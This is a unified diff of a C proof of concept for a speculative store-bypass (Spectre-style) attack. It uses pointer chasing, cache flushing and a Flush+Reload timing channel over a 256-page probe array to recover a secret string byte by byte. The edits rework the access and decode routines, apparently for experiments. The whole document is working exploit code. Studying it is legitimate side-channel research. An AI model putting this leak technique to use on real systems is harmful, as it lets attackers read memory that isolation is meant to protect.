@@ -44,6 +44,7 @@ int flush_reload_t(void *ptr) {
   return (int)(end - start);
 }
 
+
 char access_array(int x) {
   int tmp;
   // store secret in data
@@ -56,6 +57,7 @@ char access_array(int x) {
   char** data_slowptr = &data;
   char*** data_slowslowptr = &data_slowptr;
   char**** data_ultraslowptr = &data_slowslowptr;
+  //maccess(data + x);
   _mm_mfence();
   _mm_clflush(&x);
   _mm_clflush(data_slowptr);
@@ -69,24 +71,24 @@ char access_array(int x) {
 
   // overwrite data via different pointer
   // pointer chasing makes this extremely slow
-  (*(*(*data_ultraslowptr)))[x] = OVERWRITE;
+  //printf("%c", data[x]);
+  maccess(mem + data[x]*4096);
+  //*((*(*(*data_ultraslowptr))) + x) = OVERWRITE;
 
   // data[x] should now be "#"
   // uncomment next line to break attack
   //_mm_mfence();
   // Encode stale value in the cache
-  tmp = data[x];
-  maccess(mem + tmp*4096);
+  
+  
 }
 
 void cache_decode_pretty(char *leaked, int index) {
-  for(int i = 0; i < 256; i++) {
-    int mix_i = ((i * 167) + 13) & 255; // avoid prefetcher
+  static int mix_i, i;
+  for(i = 0; i < 256; i++) {
+    mix_i = ((i * 167) + 13) & 255; // avoid prefetcher
     if(flush_reload_t(mem + mix_i * 4096) < CACHE_MISS) {
-      if((mix_i >= 'A' && mix_i <= 'Z') && leaked[index] == ' ') {
-        leaked[index] = mix_i;
-      }
-      //sched_yield();
+      leaked[index] = mix_i;
     }
     _mm_mfence();
   }
@@ -95,12 +97,10 @@ void cache_decode_pretty(char *leaked, int index) {
 int main(int argc, const char **argv) {
   data = malloc(128);
   // Detect cache threshold
-  //printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
   
   int pagesize = 4096;
 
   mem = malloc(pagesize * 256);
-  // page aligned
   // initialize memory
   memset(mem, 1, pagesize * 256);
 
@@ -113,17 +113,19 @@ int main(int argc, const char **argv) {
   }
 
   // nothing leaked so far
-  char leaked[sizeof(SECRET) + 1];
-  memset(leaked, ' ', sizeof(leaked));
+  char * leaked = malloc(sizeof(SECRET) + 1);
+  memset(leaked, ' ', sizeof(SECRET) + 1);
   leaked[sizeof(SECRET)] = 0;
 
   int j = 0;
   for (int i =0; i < 10; i++) {
     // for every byte in the string
     j = (j + 1) % sizeof(SECRET);
+    _mm_mfence();
 
     // overwrite value with X, then access
-    access_array(j);
+    //access_array(j);
+    maccess(mem + 'X'*4096);
 
     _mm_mfence(); // avoid speculation
     // Recover data from covert channel
@@ -138,7 +140,7 @@ int main(int argc, const char **argv) {
   printf("%s", leaked);
   free(data);
   free(mem);
-  //printf("\n[\x1b[32m>\x1b[0m] Done\n");
+  free(leaked);
 
   return 0;
 }
